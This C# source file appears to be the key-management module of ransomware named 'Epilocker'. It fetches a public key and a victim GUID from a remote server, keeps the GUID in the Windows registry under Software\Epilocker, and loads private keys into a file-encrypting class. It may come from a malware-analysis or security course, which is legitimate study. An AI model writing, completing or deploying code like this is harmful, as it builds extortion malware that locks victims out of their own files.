using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Xml.Serialization;
using System.IO;
using Microsoft.Win32;

namespace Virologie
{
    class CryptoKeyManager
    {
        public static Guid guid;

        public static FileEncrypter CreateFromServer(string address)
        {
            XmlSerializer x = new XmlSerializer(typeof(PublicKeyCryptoResponse));
            try
            {
                var request = WebRequest.Create(address);
                WebResponse response = request.GetResponse();

                PublicKeyCryptoResponse pkres = (PublicKeyCryptoResponse)x.Deserialize(response.GetResponseStream());

                guid = pkres.guid;
                FileEncrypter ret = new FileEncrypter();
                ret.ImportKey(pkres.public_key);
                return ret;
            }
            catch (WebException e)
            {
                return null;
            }
        }

        private const string userRoot = "HKEY_CURRENT_USER";
        private const string subkey = "Software\\Epilocker";

        public static void SaveGUID()
        {
            const string keyName = userRoot + "\\" + subkey;

            Registry.SetValue(keyName, "GUID", guid);
        }

        public static bool GetGUID()
        {
            const string keyName = userRoot + "\\" + subkey;

            string value = (string)Registry.GetValue(keyName, "GUID", null);
            if (value == null)
                return false;
            guid = Guid.Parse(value);
            return true;
        }

        public static void CleanGuid()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(subkey);
            if (key != null)
            {
                key.DeleteValue("GUID");
            }
        }

        public static FileEncrypter CreateFromFile(string name)
        {
            try
            {
                StreamReader sr = new StreamReader(new FileStream(name, FileMode.Open));
                string private_key = sr.ReadToEnd();
                sr.Close();
                FileEncrypter ret = new FileEncrypter();
                ret.ImportKey(private_key);
                return ret;
            }
            catch (FileNotFoundException e)
            {
                return null;
            }
        }
    }
}
